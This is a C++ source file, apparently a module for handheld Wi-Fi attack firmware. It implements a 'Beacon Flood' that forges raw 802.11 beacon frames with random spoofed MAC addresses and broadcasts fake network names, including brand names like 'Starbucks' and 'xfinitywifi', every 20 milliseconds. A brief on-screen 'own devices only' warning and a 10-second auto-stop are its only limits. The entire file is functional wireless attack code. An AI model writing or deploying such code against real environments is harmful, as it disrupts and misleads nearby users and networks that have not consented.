#include "beacon_flood.h"
#include "../config.h"
#include "../core/display_mgr.h"
#include "../core/wifi_mgr.h"

const char* BeaconFlood::fakeSsidList[] = {
    "FreeWiFi", "Starbucks", "ATT", "xfinitywifi", "Linksys",
    "NETGEAR", "TP-Link", "D-Link", "HomeNetwork", "Guest",
    "Office", "IoT-Network", "SecurityCam", "SmartHome"
};
uint8_t BeaconFlood::fakeSsidCount = sizeof(fakeSsidList) / sizeof(fakeSsidList[0]);

ModuleInterface* createBeaconFlood() { return new BeaconFlood(); }

void BeaconFlood::init() {
    attacking = false; confirmed = false;
    attackStart = 0; lastBeacon = 0; ssidIndex = 0;
}

void BeaconFlood::enter() {
    attacking = false; confirmed = false;
    ssidIndex = 0; lastBeacon = 0;
    displayMgr.setDirty();
}

void BeaconFlood::exit() {
    if (attacking) stopAttack();
}

void BeaconFlood::sendBeacon(const char* ssid) {
    uint8_t ssidLen = strlen(ssid);
    uint8_t frame[128] = {0};

    // Frame control: Beacon (0x8000)
    frame[0] = 0x80; frame[1] = 0x00;
    // Duration
    frame[2] = 0x00; frame[3] = 0x00;
    // DA = Broadcast
    memset(frame + 4, 0xFF, 6);
    // SA = random
    for (int i = 10; i < 16; i++) frame[i] = random(256);
    // BSSID = SA
    memcpy(frame + 16, frame + 10, 6);
    // Sequence
    frame[22] = random(256); frame[23] = random(256);

    // Beacon body
    uint8_t* body = frame + 24;
    // Timestamp
    memset(body, 0, 8); body += 8;
    // Beacon Interval
    body[0] = 0x64; body[1] = 0x00; body += 2;
    // Capability Info
    body[0] = 0x01; body[1] = 0x00; body += 2;

    // SSID IE
    *body++ = 0x00;  // Element ID
    *body++ = ssidLen;
    memcpy(body, ssid, ssidLen); body += ssidLen;

    // Supported Rates IE
    *body++ = 0x01;
    *body++ = 4;
    body[0] = 0x82; body[1] = 0x84; body[2] = 0x8B; body[3] = 0x96;
    body += 4;

    // DS Parameter Set (Channel)
    *body++ = 0x03;
    *body++ = 1;
    *body++ = random(1, 14);

    wifiMgr.sendRawPacket(frame, body - frame);
}

void BeaconFlood::startAttack() {
    if (attacking) return;
    attacking = true;
    attackStart = millis();
    lastBeacon = 0;
    ssidIndex = 0;
    wifiMgr.promiscuousAcquire(getId());
}

void BeaconFlood::stopAttack() {
    attacking = false;
    confirmed = false;
    wifiMgr.promiscuousRelease(getId());
    displayMgr.setDirty();
}

void BeaconFlood::update() {
    if (!attacking) return;

    uint32_t now = millis();
    if (now - attackStart > SEC_BEACON_FLOOD_DUR) {
        stopAttack();
        return;
    }

    if (now - lastBeacon > 20) {  // 20ms per Beacon
        sendBeacon(fakeSsidList[ssidIndex]);
        ssidIndex = (ssidIndex + 1) % fakeSsidCount;
        lastBeacon = now;
        displayMgr.setDirty();
    }
}

void BeaconFlood::handleButton(ButtonEvent ev) {
    if (attacking) {
        if (ev != BTN_NONE) stopAttack();
        return;
    }
    if (!confirmed) {
        if (ev == BTN_OK_SHORT) { confirmed = true; displayMgr.setDirty(); }
    } else {
        if (ev == BTN_OK_SHORT) { startAttack(); displayMgr.setDirty(); }
    }
}

void BeaconFlood::draw(U8G2& u8g2) {
    u8g2.setFont(FONT_DATA);
    u8g2.drawStr(0, 9, "Beacon Flood");
    u8g2.setFont(FONT_DATA);
    u8g2.drawStr(0, 24, "⚠ Test Mode - Own Devices Only ⚠");

    if (attacking) {
        u8g2.setFont(FONT_BODY);
        char buf[30];
        uint32_t remaining = (SEC_BEACON_FLOOD_DUR - (millis() - attackStart)) / 1000;
        snprintf(buf, sizeof(buf), "Broadcasting... %d SSID", fakeSsidCount);
        u8g2.drawStr(2, 39, buf);
        snprintf(buf, sizeof(buf), "Left:%lus any key=stop", remaining);
        u8g2.drawStr(2, 63, buf);
    } else if (!confirmed) {
        u8g2.setFont(FONT_BODY);
        u8g2.drawStr(2, 39, "Press OK to enter test mode");
        u8g2.drawStr(2, 63, "10s auto-stop");
    } else {
        u8g2.drawStr(2, 39, "Press OK to start");
        u8g2.drawStr(2, 63, "10s auto-stop");
    }
}
